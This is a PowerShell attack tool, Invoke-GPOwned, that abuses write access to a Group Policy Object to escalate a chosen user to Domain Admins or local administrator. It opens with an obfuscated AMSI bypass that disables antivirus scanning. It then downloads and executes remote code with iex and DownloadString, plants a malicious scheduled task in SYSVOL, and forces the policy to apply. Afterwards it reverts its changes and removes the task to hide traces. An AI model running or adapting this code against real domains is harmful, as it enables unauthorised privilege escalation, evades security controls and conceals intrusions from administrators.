$an=[CHaR]([BYTe]0x53)+[cHar]([bYtE]0x79)+[ChaR]([BYTe]0x73)+[ChaR]([bYte]0x74)+[cHar]([bYtE]0x65)+[cHar]([bYtE]0x6d)+[cHar]([BYtE]0x2e)+[cHar]([BYte]0x4d)+[ChAr]([BYTe]0x61)+[cHar]([bYtE]0x6e)+[cHar]([BYTe]0x61)+[ChaR]([bYte]0x67)+[cHar]([bYtE]0x65)+[cHar]([BYTe]0x6d)+[cHar]([bYtE]0x65)+[cHar]([bYtE]0x6e)+[cHar]([BYte]0x74)+[cHar]([bYtE]0x2e)+[cHar]([BYte]0x41)+[cHar]([bYtE]0x75)+[cHar]([BYte]0x74)+[cHar]([bYtE]0x6f)+[cHar]([BYte]0x6d)+[cHar]([bYtE]0x61)+[cHar]([BYte]0x74)+[cHar]([bYtE]0x69)+[cHar]([BYte]0x6f)+[cHar]([bYtE]0x6e)+[cHar]([BYte]0x2e)+$([cHar]([BYte]0x41)+[cHar]([bYtE]0x6d)+[cHar]([BYtE]0x73)+[cHar]([bYtE]0x69))+'Utils';$fn=$([cHar]([BYte]0x61)+[cHar](69+40)+[cHar](161-46)+[cHar](105)+[cHar]([BYTe]0x49)+[cHar]([BYTe]0x6e)+[cHar](77+28)+[cHar](116)+[cHar]([BYTe]0x46)+[cHar]([BYte]0x61)+[cHar](8925/85+"")+[cHar](43+65)+[cHar]([BYTe]0x65)+[cHar]([BYte]0x64));$ft='NonPublic,Static';$sv=$true;$asm=[Ref].Assembly.GetType($an);$f=$asm.GetField($fn,$ft);$f.SetValue($null,$sv);
function Invoke-GPOwned {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [Alias("guid")]
        [string]$GPOGUID,
        
        [Parameter(Mandatory=$false)]
        [Alias("xml")]
        [string]$ScheduledTasksXMLPath,

        [Parameter(Mandatory=$false)]
        [Alias("u")]
        [string]$User,

        [Parameter(Mandatory=$false)]
        [Alias("d")]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [Alias("c")]
        [string]$Computer,
        
        [Parameter(Mandatory=$false)]
        [Alias("h")]
        [switch]$Help,

        [Parameter(Mandatory=$false)]
        [switch]$DA,

        [Parameter(Mandatory=$false)]
        [switch]$Local
    )

    if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
        Write-Output @"
Invoke-GPOwned Help:

Example : Invoke-GPOwned -GPOGUID {} -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User Administrator -Domain noteasy.local -DC dc01.noteasy.local

Parameters: (*Mandatory)
-GPOGUID*: Group Policy GUID
-ScheduledTasksXMLPath*: Full path to the ScheduledTasks xml file
-Computer*: Target computer
-Local - adds a chosen user to the local administrators goup on the defined computer
-DA - adds the user to the domain admins group
-User: Target user to elevate, mandatory for Local technique
-Domain: Target domain
"@
        return
    }


    # Enabling TLS and loading the ActiveDirectory module to memory #
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    iex(New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1")
    Import-ActiveDirectory
    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
    if(($mod.Contains("dynamic_code")) -eq "True"){
        $null
    } else {
        Write-Error "[-] ActiveDirectory module failed to load!"
        return
    }

    $guid = $GPOGUID
    $guid2 = "{"+$guid+"}"
    
    # Use provided domain or get it from AD
    if ($Domain) {
        $domain = $Domain
    } else {
        $domain = (Get-ADDomain).Forest
    }

    $domaindn = (Get-ADDomain).DistinguishedName
    
    # Use provided DC or get it from AD
    if ($Computer) {
        $dc = $Computer
    } else {
        $dc = (Get-ADDomain).InfrastructureMaster
    }

    # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
    if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
        $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
    } else {
        $noext=1
    }

    # Look for an active domain admin account #
        $i = 0
        while($gotcha -ne "1"){
            $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
            if(((net user $dauser /dom | findstr active)[29]) -eq "Y"){
                $gotcha++
            } else {
                $i++
            }
        }
    $validatexml = Get-Content $ScheduledTasksXMLPath
    if(-not(Test-Path $ScheduledTasksXMLPath)){
        Write-Output "[-] XML file not found!."
        break
    }
    elseif($validatexml.StartsWith("<?xml version")){
        Write-Output "[+] XML File is valid!."
    }else{
        Write-Output "[-] XML file empty or corrupted!."
        exit(0)
    }
    # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
    if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
        Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
        Write-Output "[-] ScheduledTasks file in SYSVOL exists, created a backup file!"
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
    } else {
        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        Write-Output "[+] Created ScheduledTasks file in SYSVOL!"
    }

    # Modifying the ScheduledTasks.xml with the gathered information #
    if($DA){
    $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
    $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
    $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    $encoding = 'ASCII'
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
    Write-Output "[+] ScheduledTasks file modified to add $User to the Domain Admins group!"
    } elseif($Local){
        $localcommand = '/r net localgroup Administrators '+$User+' /add'
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        Write-Output "[+] ScheduledTasks file modified to add $User to local administrators group on $Computer!"
    } else {
        Write-Output "[-] Either the -Local or -DA flags are required for execution!."
        return
    }
    

    $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
    $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
    Write-Output "[+] Incrementing GPT.INI Version by 1"
    $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
    $encoding = 'ASCII'
    $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
    # Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy #
    foreach ($s in $gptIniContent) {
        if($s.StartsWith("Version")) {
            $num = ($s -split "=")[1]
            $ver = [Convert]::ToInt32($num)
            $newVer = $ver + 1
            (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
                Set-Content -Encoding $encoding $gptIniFilePath -Force
        }
    }
    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
    Write-Output "[+] Current GPO AD versionNumber = $currentVersion"
    Write-Output "[+] Incrementing version by 1"
    $newVersionValue = $currentVersion+1
    # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
    Write-Output "[+] GPO AD versionNumber = $currentVersion"
    if($noext -ne 1){
        Write-Output "[+] Current gPCMachineExtensionNames : $InitialExtensions"
    } else {
        Write-Output "[+] Current gPCMachineExtensionNames : <not set>"
    }
    # Modyfing the gPCMachineExtensionNames attribute of the policy # 
    Write-Output "[+] Adding Extensions to the attribute"
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
    $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
    if($FinalizedGPO.StartsWith("[{00000000")){
        Write-Output "[+] Successfully written extensions to GPO!"
    } else {
        Write-Error "[-] Failed to write gPCMachineExtensionNames!"
        return
    }
    # A bad loading screen counting up to 300(5 minute update interval on DCs) #
    if($DA){
        for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
            if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
                break
            }
        }
        $timepassed = 0
        while((Get-ADGroupMember "Domain Admins" | findstr $User) -eq $null){
            Start-Sleep 1
            }
        Write-Output "`n`n"
        Write-Output "[+] User added to the domain admins group!"
    } elseif($Local){
         for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
                break
            }
        }
        $timepassed = 0
        while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
            Start-Sleep 1
            }
        Write-Output "[+] User added to the local admins group!"
    }
    Write-Output "[+] Reverting extensions back to what they were"
    # Reverting the gPCMachineExtensionNames #
    if($noext -ne 1){
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
    } else {
        Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
    }

    if($noext -ne 1){
    Write-Output "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
    } else {
        Write-Output "[+] Cleared gPCMachineExtensionNames!"
    }
    Write-Output "[+] Removing the scheduled task from the DC"
    # Trying to delete the scheduled task from the DC #
    try{
        Unregister-ScheduledTask -CimSession $Computer -TaskName "OWNED" -Confirm:$false
    }
    catch{
        Write-Error "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
    }
    # Reverting the ScheduledTasks.xml to the backup or deletes it #
    Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
        Move-Item \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
        Write-Output "[+] XML file restored!"
    } else {
        Write-Output "[+] File removed from SYSVOL"
    }
}
